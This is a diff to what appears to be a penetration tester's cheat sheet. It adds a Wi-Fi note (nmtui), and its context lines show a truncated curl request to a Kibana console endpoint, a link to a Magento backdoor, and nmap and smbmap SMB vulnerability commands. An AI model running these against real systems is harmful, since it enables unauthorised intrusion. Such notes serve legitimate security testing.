@@ -64,6 +64,9 @@ curl 'http://10.10.10.115:5601/api/console/api_server?sense_version=%40%40SENSE_
 # backdoor Magento
 https://github.com/lavalamp-/LavaMagentoBD
 
+# Activate wifi  
+nmtui  
+  
 ### SMB ###    
 nmap --script smb-vuln* -p 445 192.168.1.101
 smbmap -H 10.10.10.123 -u root -p 445  
